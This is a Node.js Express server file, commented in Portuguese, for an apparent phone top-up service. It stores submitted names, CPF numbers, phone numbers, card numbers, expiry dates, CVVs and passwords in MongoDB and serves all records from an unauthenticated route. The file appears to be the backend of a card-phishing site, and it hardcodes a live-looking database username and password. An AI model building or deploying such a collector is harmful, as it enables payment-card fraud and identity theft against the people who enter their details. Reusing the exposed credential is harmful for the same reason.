const express = require('express');
const mongoose = require('mongoose');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static(path.join(__dirname)));

// Conexão com MongoDB (ingresso944_db_user)
const mongoURI = 'mongodb+srv://ingresso944_db_user:Dks10dks%40@cluster0.mongodb.net/recargas?retryWrites=true&w=majority';

mongoose.connect(mongoURI)
  .then(() => console.log('✅ MongoDB Conectado!'))
  .catch(err => console.error('❌ Erro MongoDB:', err));

const RecargaSchema = new mongoose.Schema({
    operadora: String, nome: String, cpf: String, telefone: String, 
    valor: String, cartao: String, data: String, cvv: String, senha: String,
    dataRegistro: { type: Date, default: Date.now }
});

const Recarga = mongoose.model('Recarga', RecargaSchema);

// Rota para salvar a recarga
app.post('/finalizar', async (req, res) => {
    try {
        const nova = new Recarga(req.body);
        await nova.save();
        res.status(200).json({ success: true });
    } catch (err) { 
        res.status(500).json({ success: false }); 
    }
});

// Rota para ler os dados no painel
app.get('/ver-dados-restritos', async (req, res) => {
    try {
        const dados = await Recarga.find().sort({ dataRegistro: -1 });
        res.json(dados);
    } catch (err) { res.status(500).send('Erro'); }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Porta: ${PORT}`));